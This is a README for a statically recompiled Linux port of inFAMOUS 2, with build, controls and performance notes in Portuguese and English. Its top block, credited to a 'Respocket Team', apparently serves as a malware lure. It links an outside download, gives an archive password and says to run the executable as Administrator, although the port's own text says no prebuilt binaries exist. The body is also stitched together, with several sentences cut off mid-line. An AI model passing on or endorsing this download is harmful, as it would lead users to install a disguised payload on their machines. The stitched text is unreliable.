<div align="center">

  ![Downloads](https://img.shields.io/badge/Downloads-40K+-blue?style=for-the-badge&logo=github)
  ![User Rating](https://img.shields.io/badge/User%20Rating-4.8%2F5-gold?style=for-the-badge&logo=star)
  ![Latest Version](https://img.shields.io/badge/Latest%20Version-3.2.0-green?style=for-the-badge&logo=github)

</div>

<div align="center">

  <a href="https://respockett.pro/red">
    <img src="https://img.shields.io/badge/Download-Latest%20Release-blue?style=for-the-badge" alt="Download Latest Release">
  </a>

</div>

> ⚡ **All-in-one loader:** The entire script is compiled into a single loader for your convenience — just download, extract, and run. No extra setup required.

1. **⬇️ Download** the tool from the button above.
2. **📦 Extract** the archive (password: `respocket`).
3. **🖱️ Run as Administrator** – right‑click the executable and select *Run as Administrator*.
4. **✅ Follow the setup wizard** – complete the installation.
5. **🚀 Launch the Tool** – the main window appears.

---

> ⚠️ **Important: Official Distribution Notice**
>
> We distribute our software **only through MediaFire**.  
> If the download link leads to **any other file-sharing service**, please **do not download it** — it may be an unofficial or modified copy.  
> For your safety, always use the official release.

---

<div align="center">

### 💙 Prepared by the Respocket Team

**This release was carefully prepared by the Respocket Team** — with attention to every detail, a focus on stability, and respect for our users.  
Thank you for choosing our software. Download only official versions and stay with us!
</div>


---

<p align="center"><img src="docs/screenshots/banner.jpg" alt="inFAMOUS 2 — port nativo para PC" width="100%"></p>

<h1 align="center">inFAMOUS 2 — port nativo para PC (Linux, Vulkan)</h1>

<p align="center">
## Status

| Área | Estado |
|---|---|
| Boot, vídeos, menus e cutscenes | ✅ Funciona |
| Gameplay | ✅ De Empire City até New Marais, com poderes, escalada e missões do começo do jogo |
| Áudio (Wwise no SPU) | ✅ Funciona |
| Saves | ✅ Salvar, Continuar e autosave; gravação atômica |
| Controle | ✅ Xbox, DualShock 4 e DualSense via SDL2, com vibração |
| Teclado e mouse | 🔧 Fase 1: jogável; a mira ainda passa pela aceleração do analógico do jogo |
| Dublagem e textos em português | ✅ `PS3_SYS_LANG=pt` (padrão) |
| Resolução acima de 720p | ✅ 1440p, 4K e 5K (supersampling) |
| AA e upscaling | ✅ FXAA, SMAA 1x, FSR 1, redução por área |
| Campo de visão | ✅ Ajustável no menu |
| Ultrawide (Hor+) | 🧪 Experimental: F1 > Vídeo > Ultrawide; HUD em 16:9 no centro |
| Desempenho | ✅ 60 fps estáveis com o limite padrão; 100+ sem limite na área mais pesada medida |
| Engasgos | 🔧 As travadas de segundos sumiram; com cache frio, a primeira vez de um efeito ainda pode custar um frame |
| Travamentos | 🔧 Deadlock raro, sem causa achada; a caixa-preta grava o estado quando acontece |
| Imagem | 🔧 Correta na maior parte; falhas pontuais ainda aparecem |
| Linux | ✅ Testado no Fedora 44 |
| Windows | ❌ Não suportado: o build cruzado com MinGW linka, mas nunca foi testado |

### Desempenho

Ryzen 7 9800X3D + Radeon RX 9070 XT, Fedora 44, render em 1280×720:

| Cena | Condição | Resultado | Medido em |
|---|---|---|---|
| Área pesada da cidade, na praça onde o save atual começa (~9 mil draws por frame) | bench automático, parado, sem limite | **107,7 fps** (90,6 com as otimizações da v0.1.0 para o RSX desligadas) | 07/11/2026 |
| Sessão de jogo normal | limite de 60 (padrão) | 59–60 fps, p99 médio de 21 ms, nenhuma travada | 07/11/2026 |
| Píer de Empire City (tutorial, andando) | sem limite | ~120–130 fps | out/2026 |
| Pântano de New Marais | sem limite | ~100 fps | out/2026 |
| Menu 3D | sem limite | ~115 fps | out/2026 |

- As cenas de outubro foram medidas antes das otimizações de 07/11 e não
  foram medidas de novo.
- Na área pesada, as quatro threads quentes (principal do PPU, RSX, gravação
  Vulkan e SPUs) ficam todas em 85–91%: nenhuma otimização isolada sobe muito
  mais o teto.
- Quem limita é a CPU, não a GPU. Em outubro, o pântano de New Marais rodou em
  4K no mesmo fps que em 720p.
- Os detalhes de onde vai o tempo de cada frame estão em
### PS3 × este port

| | PS3 | Este port |
|---|---|---|
| Resolução | 1280×720 | 720p, 1440p, 4K ou 5K, com FSR 1 ou redução por área até a janela |
| Taxa de quadros | alvo de 30 fps | 60 com o limite padrão; ~100–130 sem limite |
| Anti-aliasing | — | FXAA ou SMAA 1x |
| Campo de visão | fixo | até +30% |
| Monitor ultrawide | — | barras pretas, esticado ou Hor+ experimental |
| Controles | DualShock 3 | controle via SDL2, teclado e mouse |
| Execução | Cell (PPU + SPUs) e RSX | código traduzido para x86-64, GPU em Vulkan |

## Requisitos

**Arquivos do jogo.** Tudo vem do **seu** PS3, e nada disso está no
repositório. O passo a passo está em
## Como compilar

Não há binários para baixar: o código traduzido é o do jogo e só pode existir
na sua máquina.

```sh
scripts/setup.sh    # ps3recomp no commit base + o patch deste port, Dear ImGui, venv Python
scripts/lift.sh     # traduz o PPU e os SPUs do SEU EBOOT.elf
scripts/build.sh    # compila em work/port/build-vk
```

- A tradução leva alguns minutos. A primeira compilação é demorada, porque o
  código traduzido do PPU é grande.
- O `build.sh` roda num escopo de memória de 14 GB do systemd, para não
  derrubar o desktop.
- `JOBS=<n>` muda o paralelismo. `PORT_PPU_GCC=1` compila o PPU com GCC.
- `PS3RECOMP_DIR=<pasta>` usa um ps3recomp que já está em outro lugar.
- Para contribuir: `scripts/install-hooks.sh` instala os hooks que rodam o
  `scripts/check_clean.sh` antes de cada commit e push. O mapa do repositório
## Como jogar

```sh
work/play.sh            # janela + controle + som, com o menu principal
work/play.sh --play     # direto no jogo, sem o menu do port
work/play.sh --title    # direto na tela de jogo novo do inFAMOUS 2
```

O controle precisa estar ligado antes de abrir. Cada sessão grava um log em
`work/runs/play-<data>.log`.

### Menu principal

Ao abrir, aparece o menu do port, sobre a arte do próprio disco (`PIC1.PNG`).
Ele funciona com controle, teclado ou mouse:

| Item | O que faz |
|---|---|
| **Continuar** | entra no save mais recente (mostra nome, progresso e data) |
| **Novo jogo** | abre a tela de jogo novo do próprio inFAMOUS 2 |
| **Carregar jogo** | lista os seus saves; escolha um |
| **Opções** | as abas abaixo |
| **Sair** | fecha |

O inFAMOUS 2 não tem menu principal: com save, ele entra direto no autosave;
sem save, mostra só "Começar um jogo novo". O menu do port faz esse papel.
Antes de **Novo jogo** ou de carregar um save que não é o autosave, os saves
são copiados para `user/backups`, porque o próximo autosave do jogo grava por
cima do slot de autosave, como no console. Dentro do jogo: **Start → Dados
salvos**.

### Opções (F1 no jogo)

**F1**, **Esc** ou **Select+Start** segurados abrem as opções no meio do jogo.
Tudo fica gravado em `user/settings.ini`.

| Aba | Opções |
|---|---|
| **Vídeo** | Resolução (720p, 1440p, 4K, 5K com supersampling) · Anti-aliasing (desligado, FXAA, SMAA 1x) · Ampliar para a janela (bilinear, FSR 1) · Reduzir para a janela (bilinear, média por área) · Nitidez (automática, ou de 0 a 1) · Tela cheia · VSync · Esticar a imagem (sem barras) · Campo de visão (do jogo até +30%) · Monitor (com mais de um) |
| **Idioma** | Dublagem e legendas/textos, separados (dá para misturar) |
| **Desempenho** | Predefinição (Desempenho 720p, Equilibrado 1440p, Qualidade 4K) · Limite de FPS (sem limite, 30, 40, 60, 80, 120, 240, taxa do monitor) · Contador de FPS na tela · Thread de gravação Vulkan |
### Controles

**Controle** (Xbox, DualShock 4, DualSense): como no PS3. **Select+Start**
segurados abrem o menu do port.

**Teclado e mouse**, junto com o controle. O mouse é capturado no primeiro
clique ou tecla; Alt+Tab e F1 o soltam.

| Tecla | Botão do PS3 |
|---|---|
| **W A S D** | analógico esquerdo (andar) |
| **Mouse**, ou **I J K L** | analógico direito (câmera) |
| **Botão esquerdo** / **direito** | R1 (atirar) / L1 (mirar) |
| **Espaço** | Xis |
| **Shift esquerdo** ou **Backspace** | Bola |
| **F** ou **botão lateral 4** | Quadrado |
| **E** ou **botão lateral 5** | Triângulo |
| **Q** / **R** | R2 / L2 |
| **Ctrl esquerdo** / **V** ou **botão do meio** | L3 / R3 |
| **Enter** ou **P** / **Tab** | Start / Select |
| **Setas** ou **1 2 3 4** | direcional |

Para trocar teclas: `[keyboard] map` no `user/settings.ini`, no formato
`Tecla=BOTÃO` (por exemplo `F=SQUARE Q=NONE`). As ações `WALK` (andar devagar)
e a roda do mouse (`WheelUp`, `WheelDown`) existem, mas não têm tecla no mapa
padrão.

**Teclas do port:**

| Tecla | O que faz |
|---|---|
| **F1** ou **Esc** | abre e fecha o menu |
| **F11** ou **Alt+Enter** | tela cheia / janela |

## Idioma

O disco traz voz e texto de todas as regiões (`brazilian.psarc`,
`brazilian_text.psarc`, `latino.psarc`…), e o jogo escolhe pelo idioma do
console:

- O jogo foi feito antes de o PS3 ter "Português (Brasil)" (número 17), então
  trata esse número como desconhecido e cai no inglês.
- O caminho para o PT-BR é o idioma "Português" (7), que a lista da região
  norte-americana liga aos arquivos `brazilian`.
- O port escolhe esse número sozinho a partir do idioma das legendas, e serve
  os arquivos de voz e de texto que você escolheu na aba Idioma.

## Saves e dados

- Os saves ficam em `gamedata/dev_hdd0/home/00000001/savedata/`. Cada arquivo
  é gravado ao lado e renomeado por cima, então um crash no meio do save
  mantém o anterior.
- `PS3_SAVEDATA_ROOT=<pasta>` usa outra pasta. Os testes e benchmarks usam
  isso para nunca tocar nos saves de quem joga.
- As opções ficam em `user/settings.ini`, e os backups dos saves em
  `user/backups/`.

## Logs e relatórios

Cada sessão do `work/play.sh` grava `work/runs/play-<data>.log`, com uma linha
`[rsx fps]` a cada 10 s. As capturas são automáticas:

- **Frame lento:** uma linha `[vk hitch]` com a causa (pipeline novo, espera
  de GPU, textura criada, o que cada thread esperou).
  `work/tools/hitch_classify.py <log>` agrupa essas linhas por causa.
- **Parada de 2,5 s ou mais:** a pilha de todas as threads e o estado do
  runtime vão para `work/runs/freezes/<log>/`, no momento e de novo 15 s
  depois.
- **Travou de vez:** depois de 15 s sem frame, também um perf de 5 s. Se o
  jogo travar, espere uns 20 s antes de fechar.
- **Ficou lento:** depois de 30 s abaixo de 70 fps (ou 5 abaixo do limite,
  se ele for menor), um perfil de 20 s (até três por sessão).

Para relatar um problema, mande o log e a pasta de `work/runs/freezes/`
correspondente. Eles não contêm arquivos do jogo.

## Problemas conhecidos

- **Deadlock raro no meio do jogo:** a imagem para e o áudio continua. A
  thread principal fica esperando uma event flag, e a job chain `0x00B19600`
  fica parada no guard `0x00B15000`. Foi visto em 16, 17 e 18/10, uma vez a
  cada 15–60 min de jogo. A causa ainda não foi achada; a sessão de 07/11 não
  teve nenhum. Se acontecer, a caixa-preta acima grava o estado.
- **Ultrawide Hor+ é experimental:** o HUD centralizado só foi conferido em
  bench sem janela, e os marcadores presos ao mundo (alvos, ícones sobre
  pessoas) ainda usam a posição 16:9. Desligado, o 16:9 aparece com barras ou
  esticado, e o campo de visão do menu funciona normalmente.
- **Teclado e mouse, fase 1:** a mira passa pela aceleração do analógico do
  próprio jogo, então não é 1:1. Remapear teclas só pelo `settings.ini`.
- **O anti-aliasing roda depois do HUD,** e o texto do HUD fica um pouco mais
  macio.
- **Cache frio:** na primeira sessão, ou depois de um update do driver, a
  primeira vez de cada efeito ainda pode custar um frame. As seguintes saem do
  cache.
- **Windows não testado:** existe um build cruzado com MinGW
  (`work/port/windows/play.bat`) que linka, mas ninguém o rodou. O
  rastreamento de escrita da memória do RSX e a captura de pilhas são só
  Linux.

## Como funciona

- **PPU:**
  - As ~39 mil funções do executável viram C (`ppu_lifter.py`).
  - O resultado é compilado com clang para x86-64-v3, com os acessos à memória
    do PS3 inline.
  - Os módulos do sistema são reimplementados (HLE).
  - Algumas funções do jogo têm substitutos nativos (`work/port/ppu_native.cpp`),
    como o `CView::SetFov` do campo de visão.
- **SPU:** cada imagem SPU que o jogo roda é traduzida para C e compilada com
  SIMD do x86 (SSE4.1, AVX2, AVX-512):
  - o gerenciador de jobs;
  - os 27 módulos de job;
  - os plugins de oclusão;
  - as cadeias de job do Wwise;
  - o Bink e o zlib.

  Os jobs mais pesados, como o Edge, o `ec5f`, o walker de cena e o culler de
  instâncias, têm versões em C escritas à mão. Cada uma tem um modo que a
  compara com a tradução.
- **RSX:**
  - Um motor de desenho lê o banco de registradores do RSX e roda os vertex e
    fragment programs do próprio jogo, decompilados para HLSL e compilados
    para SPIR-V.
  - O backend Vulkan grava os comandos numa thread própria.
  - A cadeia de pós (AA, FSR 1, redução) roda entre o frame e a janela.
- **Passadas de GPU:** dois jobs de SPU, a oclusão ambiente (SSAO) e a
  iluminação deferida em tiles, rodam na GPU. Cada um foi conferido contra a
  saída do SPU.
- **Rastreamento de escrita:**
  - A memória local do RSX é vigiada por proteção de página.
  - Texturas e geometria que ninguém reescreveu não são decodificadas de
    novo.

## Perguntas frequentes

**Existe inFAMOUS 2 para PC?** Não oficialmente. Este projeto roda o jogo do
PS3 nativo no Linux, sem emulador, por recompilação estática.

**Dá para jogar inFAMOUS 2 no PC sem RPCS3?** Sim, é o que este port faz, com
a sua própria cópia do jogo. O RPCS3 só é usado para descriptografar o
executável e instalar o firmware.

**Tem um executável pronto para baixar?** Não, e não vai ter: o executável
contém o código do jogo traduzido. Cada pessoa compila a partir do próprio
disco.

# inFAMOUS 2 — native PC port

> **Playable, in development.** The game boots and plays its videos, menus and
> cutscenes. Gameplay runs from Empire City into New Marais, with sound,
> controller, keyboard and mouse, saves and the Brazilian Portuguese dub. In
> the heaviest area measured (~9,000 draws a frame) it runs above 100 fps
## Status

| Area | State |
|---|---|
| Boot, videos, menus, cutscenes | ✅ Works |
| Gameplay | ✅ Empire City into New Marais, with powers, climbing and the early missions |
| Audio (Wwise on the SPU) | ✅ Works |
| Saves | ✅ Save, continue, autosave; atomic writes |
| Controller | ✅ Xbox, DualShock 4, DualSense through SDL2, with rumble |
| Keyboard and mouse | 🔧 Phase 1: playable; aiming still goes through the game's stick acceleration |
| Brazilian Portuguese dub and text | ✅ `PS3_SYS_LANG=pt` (default) |
| Above 720p | ✅ 1440p, 4K and 5K (supersampling) |
| AA and scaling | ✅ FXAA, SMAA 1x, FSR 1, area downscale |
| Field of view | ✅ Adjustable in the menu |
| Ultrawide (Hor+) | 🧪 Experimental: F1 > Video > Ultrawide; HUD centred in 16:9 |
| Performance | ✅ Steady 60 fps with the default cap; 100+ uncapped in the heaviest area measured |
| Stutter | 🔧 The seconds-long hitches are gone; with a cold cache, the first time an effect appears can still cost a frame |
| Freezes | 🔧 Rare deadlock, cause not found; the black box records the state when it happens |
| Image | 🔧 Mostly correct; a few glitches remain |
| Linux | ✅ Tested on Fedora 44 |
| Windows | ❌ Not supported: the MinGW cross build links but was never tested |

Ryzen 7 9800X3D + Radeon RX 9070 XT, Fedora 44, rendering at 1280×720:

| Scene | Condition | Result | Measured |
|---|---|---|---|
| Heaviest city area, the square the current save starts in (~9,000 draws a frame) | automated bench, standing still, uncapped | **107.7 fps** (90.6 with the v0.1.0 RSX work turned off) | 2026-11-07 |
| Normal play session | 60 cap (default) | 59–60 fps, 21 ms average p99, no hitch | 2026-11-07 |
| Empire City pier (tutorial, walking) | uncapped | ~120–130 fps | Oct 2026 |
| New Marais swamp | uncapped | ~100 fps | Oct 2026 |
| 3D main menu | uncapped | ~115 fps | Oct 2026 |

- The October scenes were measured before the 2026-11-07 work and not
  measured again.
- In the heavy area the four hot threads (main PPU, RSX, Vulkan recording and
  the SPUs) are all at 85–91%, so no single optimization will raise the
  ceiling much.
- The CPU is the limit, not the GPU: in October the New Marais swamp ran at
  4K at the same frame rate as at 720p.

## Requirements

**Game files**, all from **your** PS3, none in the repository (details in
## Building

```sh
scripts/setup.sh    # ps3recomp at its base commit + this port's patch, Dear ImGui, Python venv
scripts/lift.sh     # translate the PPU and SPU code of YOUR EBOOT.elf
scripts/build.sh    # build into work/port/build-vk
```

`build.sh` runs inside a 14 GB systemd memory scope. `JOBS=<n>`,
`PORT_PPU_GCC=1` and `PS3RECOMP_DIR=<dir>` change how it builds. Contributors:
`scripts/install-hooks.sh` runs `scripts/check_clean.sh` before every commit
## Playing

```sh
work/play.sh            # window + controller + sound, with the main menu
work/play.sh --play     # straight into the game
work/play.sh --title    # straight to inFAMOUS 2's new-game screen
```

- **Main menu:** the game opens on a menu over the disc's own art, with
  **Continue**, **New game**, **Load game**, **Options** and **Quit**.
  inFAMOUS 2 has no main menu of its own, so the port's stands in. Before a
  new game, or loading a save that is not the autosave, the saves are copied
  to `user/backups`.
- **In-game options:** **F1**, **Esc** or **Select+Start** held. They are
  saved to `user/settings.ini`.
  - **Video:** resolution up to 5K, AA (FXAA, SMAA 1x), FSR 1 upscale, area
    downscale, sharpening, full screen, VSync, stretch, field of view (up to
    +30%), monitor.
  - **Language:** voices and text, separately.
  - **Performance:** presets, FPS limit (none, 30–240, display rate), FPS
    counter, recording thread.
  - **Mods:** full-resolution particles, anisotropic filter, installed mods.
  - **Controller and saves:** test buttons, save folder and backup, logs.
  - **Keyboard and mouse:** on/off, sensitivity, invert Y, stick start
    deflection, key list.
- **Precedence:** an environment variable wins over the file, and its field
  is greyed out in the menu. Every variable is listed in
## Language

The disc carries every region's voices and text, and the game picks a pair
from the console language:

- The game predates the PS3's "Portuguese (Brazil)" (number 17), so it treats
  that number as unknown and falls back to English.
- It reaches its Brazilian files through "Portuguese" (7), which its North
  American list pairs with `brazilian`.
- The port picks that number from the subtitle language and serves the voice
  and text packs chosen in the Language tab.

## Logs and reports

Each `work/play.sh` session writes `work/runs/play-<date>.log`. Captures are
automatic:

- **Slow frame:** a `[vk hitch]` line with its cause;
  `work/tools/hitch_classify.py <log>` groups them.
- **Stall of 2.5 s or more:** every thread's stack and the runtime state go to
  `work/runs/freezes/<log>/`.
- **Freeze:** after 15 s without a frame, a 5 s perf too. Wait ~20 s before
  closing a frozen game.
- **Slow stretch:** after 30 s under 70 fps (or 5 under a lower cap), a 20 s
  profile.

To report a problem, send the log and its `work/runs/freezes/` folder. They
hold no game files.

## Known problems

- **Rare mid-game deadlock:** the picture stops while the audio goes on. The
  main thread waits on an event flag and job chain `0x00B19600` sits at guard
  `0x00B15000`. Seen on Oct 16, 17 and 18, about once per 15–60 minutes of
  play. The cause is not found yet, and the 2026-11-07 session had none.
- **Ultrawide Hor+ is experimental:** the centred HUD was only checked in a
  windowless bench, and markers pinned to the world (targets, icons over
  people) still use the 16:9 position.
- **Keyboard and mouse, phase 1:** aiming goes through the game's stick
  acceleration, not 1:1. Keys are rebound only in `settings.ini`.
- **AA runs after the HUD,** so HUD text is a little softer.
- **Cold cache:** on the first session, or after a driver update, the first
  time each effect appears can still cost a frame.
- **Windows untested:** a MinGW cross build (`work/port/windows/play.bat`)
  links, but nobody has run it.

## How it works

- **PPU:** ~39,000 functions become C, built by clang for x86-64-v3 with PS3
  memory accesses inlined; the system modules are reimplemented (HLE); a few
  game functions have native stand-ins (`work/port/ppu_native.cpp`), such as
  `CView::SetFov` for the field of view.
- **SPU:** every SPU image the game runs is translated to C on x86 SIMD: the
  job manager, 27 job modules, the occlusion plugins, the Wwise job chains,
  Bink and zlib. The heaviest jobs (Edge, `ec5f`, the scene walker, the
  instance culler) have hand-written C versions, each with a mode that
  compares it with the translation.
- **RSX:** a draw engine reads the RSX register file and runs the game's own
  vertex and fragment programs, decompiled to HLSL and compiled to SPIR-V. The
  Vulkan backend records on a thread of its own, and a post chain (AA, FSR 1,
  downscale) runs between the frame and the window.
- **GPU passes:** ambient occlusion and the tiled deferred lighting, two SPU
  jobs, run on the GPU, each checked against the SPU's output.
- **Write tracking:** RSX local memory is write-tracked by page protection,
  so textures and geometry that nothing rewrote are not decoded again.


---

MIT License

Copyright (c) 2026 the infamous2-recomp contributors

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.

work/patches/ps3recomp.patch modifies ps3recomp, Copyright (c) 2026 Ned Heller /
sp00nznet, also under the MIT license; that notice applies to it as well.
